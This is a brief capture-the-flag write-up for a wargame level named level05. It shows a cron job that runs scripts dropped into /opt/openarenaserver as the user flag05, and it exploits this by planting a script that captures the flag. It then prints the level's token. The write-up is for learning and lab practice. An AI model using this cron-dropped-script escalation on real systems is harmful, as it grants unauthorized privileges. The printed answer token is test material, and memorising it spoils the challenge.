Exploring the tree of this new level we find out in /var/mail a curious level05 file. Here is content:

``` */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 ```

the mentioned file does :


```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

```

So now we need to reach /usr/sbin/openarenaserver and find a way to get the flag with that.

We can simply drop there a getflag.sh script like this :


```
echo "getflag > /tmp/getflag.txt" > getflag.sh
```

after a few moments, the script will disapear and we could cat the getflag.txt:


```
ls
getflag.sh
ls
cat /tmp/getflag.txt
Check flag.Here is your token : viuaaale9huek52boumoomioc
```